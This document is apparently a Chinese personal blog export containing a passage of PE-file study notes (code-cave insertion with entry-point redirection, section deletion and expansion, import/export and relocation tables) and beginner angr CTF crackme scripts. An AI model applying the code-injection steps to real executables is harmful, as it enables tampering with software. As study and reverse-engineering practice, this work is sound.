<li>首先在文件中确定一段空间，然后运行程序的时候查看 是否为空</li>
<li>插入，根据内存中的位置计算</li>
<li>改入口，内存中代码的起始位置<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230612183816.png"></li>
</ol>
<p>第一次尝试的时候成功弹出了窗口，但是关闭之后没有出现记事本，由此我们可以判断执行完我们的代码后，没有成功的返回原入口。此时才想起来补码写错了，插入的位置是87b0，入口点是739d，739d-83b0-5&#x3D;<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230612184514.png"></p>
<p>然后我就在e9后面填充了E8 EF 00 00,意识到返回出现问题后，想到了有符号数的符号扩展，应该扩展其符号位即1，所以正确的补码形式是FF FF EF E8,填充进去就是E8 EF FF FF.</p>
<h3 id="删除节"><a href="#删除节" class="headerlink" title="删除节"></a>删除节</h3><p>删除一个节比较简单，尤其是删除最后一个节，.reloc节区是基址重定位表，删除这个节区对程序的正常运行没有影响，而且删除这个节区可以将文件的大小缩减。下面说一下步骤：</p>
<ol>
<li>将.reloc节区头用0覆盖</li>
<li>删除reloc节区</li>
<li>修改Image_FILE_HEADER中的numberofsection成员</li>
<li>修改IMAGE_OPTIONAL_HEADER中的SizeofImage</li>
</ol>
<h4 id="覆盖-reloc节区头"><a href="#覆盖-reloc节区头" class="headerlink" title="覆盖.reloc节区头"></a>覆盖.reloc节区头</h4><p>28个字节</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143105.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143154.png"></p>
<h4 id="删除节区"><a href="#删除节区" class="headerlink" title="删除节区"></a>删除节区</h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143402.png"></p>
<p>因为是最后一个节区，所以我们只要将C000即后面的东西删除即可</p>
<h4 id="修改Image-FILE-HEADER"><a href="#修改Image-FILE-HEADER" class="headerlink" title="修改Image_FILE_HEADER"></a>修改Image_FILE_HEADER</h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143559.png"></p>
<p>将5改成4即可</p>
<h4 id="修改IMAGE-OPTIONAL-HEADER"><a href="#修改IMAGE-OPTIONAL-HEADER" class="headerlink" title="修改IMAGE_OPTIONAL_HEADER"></a>修改IMAGE_OPTIONAL_HEADER</h4><p>原来程序在内存中展开的大小为11000</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143749.png"></p>
<p>减去删除的节在内存中展开的大小即可<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143805.png"></p>
<p>尝试运行，一切正常。左边是删除roloc节区的程序，可以看到大小发生了改变。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626142054.png"></p>
<h3 id="扩大节"><a href="#扩大节" class="headerlink" title="扩大节"></a>扩大节</h3><p><strong>为什么要扩大节？</strong></p>
<p>前面演示插入的代码很短，如果要插入一段比较长的代码，可能找不到合适的空间。常见的解决方案就是扩大节，那么扩大哪一个节呢？<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608032628.png"></p>
<p>根据这个图不难看出，最好是扩大最后一个节，因为扩大前面的节如果想不影响程序的正常运行，还要去修改节表里的属性。</p>
<p><strong>扩大节的步骤</strong></p>
<ol>
<li>分配空间</li>
<li>修改SizeofRawData和VirtualSize</li>
<li>修改SizeofImage（内存对齐大小）</li>
<li>如果扩展的节没有可执行属性，我们可以在节表结构体更改其属性。</li>
</ol>
<p>1.分配一块新的空间,大小为S，这里我们选择在最后一个节后面分配0x1000byte的空间<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613030824.png"></p>
<p>2.修改该节节表信息。要修改Size of Raw Data（实际大小）和Virtual Size（文件对齐后的大小），将这两个值修改为N。从前面的学习，我们了解到文件对其后的大小不一定大于实际大小，我们只需选择其中那个大的值max，N&#x3D;max+S。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613032013.png"></p>
<p>将这两个位置改为9400</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613032216.png"></p>
<p>3.修改Size of Image（扩展pe头成员）即文件在内存中展开后的大小。SizeofImage就是内存对其后的大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613032917.png"></p>
<p>将该值按照内存对齐之后，再加上新增的0x1000即可，修改完保存，程序正常运行。</p>
<h3 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h3><h3 id="合并节"><a href="#合并节" class="headerlink" title="合并节"></a>合并节</h3><h2 id="详解导入导出表"><a href="#详解导入导出表" class="headerlink" title="详解导入导出表"></a>详解导入导出表</h2><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p>前置知识，一个可执行程序是有<strong>多个pe文件组成</strong>的。</p>
<p><strong>导入表</strong>：描述pe文件引用了哪些文件，相当于进货清单。</p>
<p><strong>导出表</strong>：当前pe文件提供哪些函数供其他文件使用，相当于饭店的菜单。</p>
<h4 id="导出表在哪里？"><a href="#导出表在哪里？" class="headerlink" title="导出表在哪里？"></a>导出表在哪里？</h4><p>在扩展pe头，最后一个成员，是个结构体数组，这个结构体的第一个成员就存放着导出表的相关信息。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230616021827.png"></p>
<p>第一个成员名字就叫导出表，用peview查看<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230616022003.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230616022108.png"></p>
<p>导出表的第一个成员<strong>VirtualAddress</strong>记录着内存偏移地址(RVA)，<strong>Size</strong>记录着导出表的大小。</p>
<p>我们动一下手，拿keyHook.dll试试手<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817165959.png"></p>
<p>RVA是80B0，查了一下在rdata段，rdata段的起始RVA为6000，所以相对地址就是20B0，rdata段的pointer to raw data及文件偏移地址为5000，所以他的FOA为70B0，大小是5B字节。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817170505.png"></p>
<p>导出表的成分是非常复杂的<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817170614.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817170716.png">它还含有三张子表格，我们可以看到这是40字节的内容，而我们刚才查看的是5B字节，其实这个5B是算上子表之后的大小。</p>
<h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>name指针，对应的值是000080EC，对应的FOA是70EC<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817172218.png"></p>
<p>指向一个ascii字符串（当前dll的名称），0表示结尾。</p>
<h4 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>所有导出函数的个数</p>
<h4 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>根据函数名到处函数的个数，除了根据函数名导出函数，还能根据序号，也就是启用函数名定义一套序号规则，在一定程度上，通过序号导出函数能够增加程序的分析难度。</p>
<h4 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>导出函数地址表RVA，又是一张表，表的成员每一个都是<strong>四字节</strong>大小，代表的是函数所在的地址。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821154814.png"></p>
<h4 id="AddressOfNames"><a href="#AddressOfNames" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>导出函数名称表。存储的函数名称所在的地址。每个成员<strong>四字节</strong>大小。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821155029.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821155734.png"></p>
<p>首先查到AddressOfNames的RVA为80D0，那么FOA是70D0，第一个成员80F8注意这是RVA，换算成FOA是70F8，对应可以看到“HookStart”，后面一个是8102,换算成FOA是7102，对应“Hookstop”</p>
<h4 id="AddressOfNamesOrdinals"><a href="#AddressOfNamesOrdinals" class="headerlink" title="AddressOfNamesOrdinals"></a>AddressOfNamesOrdinals</h4><p>导出函数序列号表。有几个根据函数名称导出的函数，该表就有几个成员。每个成员二字节大小。</p>
<p>这是一个API，它有两个参数，<strong>DLL的句柄</strong>就是该DLL在内存展开时的地址，<strong>函数名</strong></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821163246.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821163637.png"></p>
<p>当API通过函数名调用函数，比如说它调用了hookstart，那么它会前往函数名称列表获得hookstart的索引值0，之后会去序号列表，序号列表下标为零的值是0，拿到这个0再去函数地址列表充当索引最终找到函数的地址。有时候不是通过函数名而是通过函数序号查找函数，这就要用到刚才没介绍的一个成员Base,它的值是函数地址列表的起始序号，如果其实序号为10，所调用的函数的序号是11，那么第二个成员hookstop的序号对应为11，完成调用。</p>
<h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>导入几个模块就有几张导入表，每个表记录该模块的信息。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822005247.png"></p>
<p>导入表信息位置：在扩展pe头的最后一个成员（结构体数组），该结构体数组的第二个成员记录着导入表信息。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822003801.png"></p>
<p>两个成员分别是导入表的<strong>地址</strong>和导入表的<strong>大小</strong>。有没有指明导入表数量的成员？答案是没有，我们可以通过查看16进制数据判断，每个导入表的大小是20个字节，从起始位置划分每20字节一组，直到出现一组20字节全部为0即代表结束，从而可以判断数量。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822010616.png"></p>
<h4 id="Name-2"><a href="#Name-2" class="headerlink" title="Name"></a>Name</h4><p>该成员是一个RVA，指向一个字符串，即该模块的名字。</p>
<h4 id="characteristic-x2F-originalfirstthunk"><a href="#characteristic-x2F-originalfirstthunk" class="headerlink" title="characteristic&#x2F;originalfirstthunk"></a>characteristic&#x2F;originalfirstthunk</h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822123240.png"></p>
<p>这个联合指向的是IMAGE_THUNK_DATA结构体，这些结构体组成<strong>INT（import name table）</strong>，要用到该模块的几个函数，就有几个IMAGE_THUNK_DATA结构体，每个结构体大小是4字节，当出现连续的4字节为0，则说明INT截止。</p>
<p>导入表的地址是6B24,6B24处的第一个成员的值是7b60,转换成foa是6b60，IMAGE_THUNK_DATA结构体就在6B60处</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822121355.png"></p>
<p>IMAGE_THUNK_DATA结构体：<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822121737.png"></p>
<p>这个结构体看着很复杂，其实他只有一个四字节的成员，联合只是给这一个成员起了多个名字方便理解。</p>
<p>如果，IMAGE_THUNK_DATA第一位为1，则说明它是序号，是前面导出表提到的<strong>函数序号列表</strong>的内容，对应的是要导入的函数没有名字只提供了序号。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822123421.png"></p>
<p>如果不为1，则是一个RVA，指向importbyname：该表仅三字节大小，如果第一个hint不为0，则说明是<strong>函数地址列表</strong>的序号。<strong>Name</strong>只有一个字节，显然不可能，因为函数的名称长度是不确定的，所以只记录它的第一个字符，遇到0则表示结束。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822122250.png"></p>
<p>完整的理一遍，首先通过扩展pe头的左后一个成员import table找到了导入表，导入表的第四个成员是个RVA指向了kernel32.dll字符串,这是导入的模块的名称，通过导入表的第一个成员（一个RVA指向）IMAGE_THUNK_DATA，该成员的最高位不为1，说明是个RVA，通过这个RVA找到了importbyname，通过该成员的第三个字节找到了导入的这个模块所使用的一个函数GetModuleFileNameA</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822124731.png"></p>
<p>PE文件加载前后，IAT（import address table）导入地址表发生变化，IAT不在指向函数名称，而是已经根据函数名称更换了表格。INT那里相当于一层保险，当程序IAT被修改（脱壳时就要修复导入表），无法找到函数时，可以根据INT和相关函数得到函数地址，从而修复IAT。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822154619.png"></p>
<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p><strong>重定位表的作用</strong>：如果可执行文件中的全部的地址相关的数值都是RVA即相对imagebase来的，那么重定位表可有可无。但是有的全局变量他的地址是硬编码，只有文件被加载到了内存中特定的位置在能正常使用，但是可执行文件往往要加载多个dll，原来那个位置可能已经被占了，这时候只能再选一个空闲的地址，此时imagebase就不是预期的值了，这种情况就要根据重定位表进行修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    x=<span class="number">11</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码的汇编码如下，mov 【00427e34】，11h   由于全局变量使用了硬编码，显然只有加载的特定的位置该代码才能生效。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822161736.png"></p>
<p><strong>位置</strong>：还是在扩展PE头最后一个结构体数组，第六个成员。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230823003816.png"></p>
<p><strong>成员：</strong> 根据名字就可以看出，第一个是地址，第二个是大小，不过这个大小，指的是该结构体的大小。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230823004102.png"></p>
<p>上图代表的就是这个结构体，x表示第一个成员，y表示大小，第一个结构体的y为16，所以该结构体16字节大小，再往下就是下一个，下一个是20字节大小，再往下是12字节大小，当遇到连续的八个字节为0，也就是x和y都为0时，代表该表格结束。解释一下为什么要这样设计，其实这个表存放的是要进行重定位的成员的地址，X代表的相当于一个基地址，Y后的每一个成员即从第九个字节开始，每两个字节为一个成员，比如X的值为80 00 00 00,后面的字节为12，16，18，则代表         80 00 00 12、80 00 00 16、80 00 00 16需要进行重定位，可以看到存放一个实际的地址需要4个字节，存放10个是40字节，而我们采用基地址加偏移的方法只使用了24个字节，需要重定位的值越多，节省的空间就越多。（这个区块是根据内存页进行划分的，每个页4KB，每个页有一个重定位表，而两个字节的偏移地址能表示0~ffff，足够对一个页进行寻址，若要寻址至少需要12个位，一字节不够，所以选择二字节作为偏移地址的单位）。</p>
<p><strong>重点：</strong> Y后的成员，两字节即16位一组，其实表示有效地址的是低12位，高四位并非没有作用，当高四位位0011的时候，才代表该处的值需要进行修复，比如说第一个成员为0011 0011 1111 1111，前四位为0011，代表该成员需要被修复，取低12位加上X基地址即是真正需要修改的。若高4位不是0011，则该处数据无作用，可以理解为用来内存对齐的垃圾数据。</p>
<p>完结撒花了！！！！！！！！！！！！！！！！！！！！！！ hhh</p>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>angr学习</title>
    <url>/2023/05/28/angr%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>早就听闻了angr，之前看wp也有大佬使用了angr，上一次打开angrctf一头雾水，还要装环境啥的，就先搁置了。现在趁着军训开始angr的学习。</p>
<span id="more"></span>

<p>tnnd两天都没配置好一个虚拟环境，还是在朋友的帮助下搞了个docker，woc真难绷，或许以后有能力了可以搞一个虚拟机，包含所有的逆向需要的环境hhh。一天后来考古，那个docker用起来着实别扭，不知道出了什么问题，不能将主机的文件拷贝到容器中，还有就是用了docker start 容器id也启动不了容器，只好另寻他路，本来想放弃的，可是一想到被这环境折磨三四天了，哎。终于，在wsl的虚拟环境成功搭建！！！</p>
<p>记录一下启动步骤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#在angr_enviroment打开环境</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> myenv/bin/activate</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#关闭环境</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">deactivate</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/a_touhouer/article/details/106058311">(15条消息) 在wsl上安装angr框架_wsl2下安装angr workon_ljahum的博客-CSDN博客</a></p>
<h1 id="Angr介绍"><a href="#Angr介绍" class="headerlink" title="Angr介绍"></a>Angr介绍</h1><p>看一看官方文档的解释</p>
<blockquote>
<p>angr is a multi-architecture binary analysis toolkit, with the capability to perform dynamic symbolic execution (like Mayhem, KLEE, etc.) and various static analyses on binaries. </p>
<p>angr是一个多架构二进制分析工具包，具有执行动态符号执行（例如Mayhem，KLEE等）和各种静态分析的能力。</p>
</blockquote>
<p>什么叫<strong>符号执行</strong>呢？</p>
<h2 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h2><p>符号执行是一种静态分析技术，是一种计算机科学领域的程序分析技术，通过采用抽象的符号代替精确值作为程序输入变量，得出每个路径抽象的输出结果。 这一技术在硬件、底层程序测试中有一定的应用，能够有效的发现程序中的漏洞。符号执行就是给程序传递一个符号而不是具体的值，让符号伴随程序运行，当遇到分支时angr会保留所有分支以及进入分支的约束条件，最后根据约束条件对我们传递的符号约束求解。这听着有点像全自动z3。</p>
<p>概念有点抽象，不如直接做题。</p>
<h1 id="Angr-CTF"><a href="#Angr-CTF" class="headerlink" title="Angr_CTF"></a>Angr_CTF</h1><p>参考链接：<a href="https://www.bilibili.com/video/BV167411o7WK/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=edc820e8f9bd6b2ea43cb8499151dea3">angr符号执行练习 00_angr_find_哔哩哔哩_bilibili</a></p>
<p>​                   <a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/blob/master/%E7%AC%94%E8%AE%B0/04/Angr_CTF%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%EF%BC%88%E5%9B%9B%EF%BC%89.md">angr从入门到精通</a></p>
<p>​                  <a href="https://xz.aliyun.com/t/7117#toc-14">angr核心概念即模块解读</a></p>
<h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ul>
<li>创建project</li>
<li>设置state</li>
<li>新建符号量 : BVS (bitvector symbolic ) 或 BVV (bitvector value)</li>
<li>把符号量设置到内存或者其他地方</li>
<li>设置 Simulation Managers ， 进行路径探索的对象</li>
<li>运行，探索满足路径需要的值</li>
<li>约束求解，获取执行结果</li>
</ul>
<h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr00</span>():   </span><br><span class="line"><span class="comment">##创建project</span></span><br><span class="line">  path_to_binary=<span class="string">&quot;./home/mzyy/AngerCTF/00_angr_find/00_angr_find&quot;</span></span><br><span class="line">  project=angr.Project(path_to_binary) </span><br><span class="line"></span><br><span class="line"><span class="comment">##设置state  state代表实例镜像，模拟执行某个时刻的状态。</span></span><br><span class="line">  initial_state=project.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="comment">##设置SM,project只是程序最开始的一个状态，我们实际对simulation对象进行操作，他模拟程序某时刻的状态</span></span><br><span class="line">  simulation=project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line"><span class="comment">##运行，探索满足路径需要的值</span></span><br><span class="line">  print_good_address=<span class="number">0x8048678</span>     <span class="comment">##通过ida找到输出good的地址</span></span><br><span class="line">  simulation.explore(find=print_good_address) </span><br><span class="line"><span class="comment">##通过explore(),找到能够到达某个地址的状态，同时丢弃不能达到这个地址的状态</span></span><br><span class="line"><span class="comment">##当启用find参数启动.explore()方法时，程序会一直执行，直到发现一个和find参数指定的条件匹配的状态</span></span><br><span class="line"><span class="comment">##find参数的内容可以是想要执行到的某个地址。。。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##获取执行结果</span></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state=simulation.found[<span class="number">0</span>]  <span class="comment">##</span></span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    angr00()</span><br></pre></td></tr></table></figure>

<p>下面是用ipython写的截的图，是跟着B站的一位up主来的。</p>
<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230524112747.png"></p>
<h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230524174356.png"></p>
<p>反编译main函数时说函数过大无法反编译（可以通过修改ida的设置文件，提高最多分析长度来解决此问题）。这一题实际上也不需要，根据函数名，我们找到avoid_me的地址加到参数中即可。<img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230524174747.png"></p>
<p>查看avoid_me的交叉引用，发现巨多。我们可以看到全是main函数在引用，这就是main函数巨大的原因吧。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr01</span>():</span><br><span class="line">    path=<span class="string">&quot;./angrctf/01_angr_avoid&quot;</span></span><br><span class="line">    p=angr.Project(path)</span><br><span class="line">    init_state=p.factory.entry_state()</span><br><span class="line">    sm=p.factory.simgr(init_state)</span><br><span class="line">    sm.explore(find=<span class="number">0x080485FC</span>,avoid=<span class="number">0x080485BF</span>)</span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    angr01()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230524181047.png"></p>
<p>这一题就是想让我们知道，避开一些错误的路径可以提高效率，我觉得将上面的avoid删掉一样可以达到目的，不过时间可能会很夸张。哎呀被打脸了，跑了十分钟左右跑出来一个killed。<img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230524182422.png"></p>
<p>好吧电脑内存不足，进程被系统杀死了，那如果内存足够大还是能跑出来的吧。提出问题和回答问题的人都好耐心好有礼貌^_^</p>
<h2 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2><p>很显然这次不能通过输出good job的地址来解题了，因为这一题故意设置了很多跳转，使用了多次put good job和多次put try again。根据作者的注释，在一些情况下我们可能不知道要达到的指令的地址，或者没有特定的指令目标。在这种情况下，我们只要知道一种状态，例如在某状态下二进制文件打印出“Good Job”。angr提供了一种功能强大的方法：允许搜索满足任意条件的状态。具体来讲，我们可以使用一个函数来定义一个状态，该函数接收一个state作为参数，并返回True或false表示该状态是否满足要求。当程序找到一个符合条件的状态时，他就会停止搜索。具体看下面这函数，它检查状态的标准输出是否包含字符串 “Good Job.”。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful_state</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h3 id="find的用法"><a href="#find的用法" class="headerlink" title="find的用法"></a>find的用法</h3><p>除了地址之外，<code>find</code> 参数还可以是一个函数，该函数接受一个路径（<code>path</code>）作为参数，并返回一个布尔值。当该函数返回 <code>True</code> 时，路径组将停止探索。例如，以下代码使用 <code>find</code> 方法搜索二进制文件中所有包含 <code>win_function</code> 函数的路径，并打印出对应的输入数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;/path/to/binary&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">pg = proj.factory.path_group(state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win_function</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Congratulations!&quot;</span> <span class="keyword">in</span> path.state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pg.explore(find=win_function)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> found <span class="keyword">in</span> pg.found:</span><br><span class="line">    <span class="built_in">print</span>(found.state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>win_function</code> 是一个用于检查路径是否包含特定输出的函数。在探索过程中，每当发现一个路径包含 <code>win_function</code> 函数并生成相应的结论时，路径组将停止探索，并输出相应的输入数据。</p>
<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230525002345.png"></p>
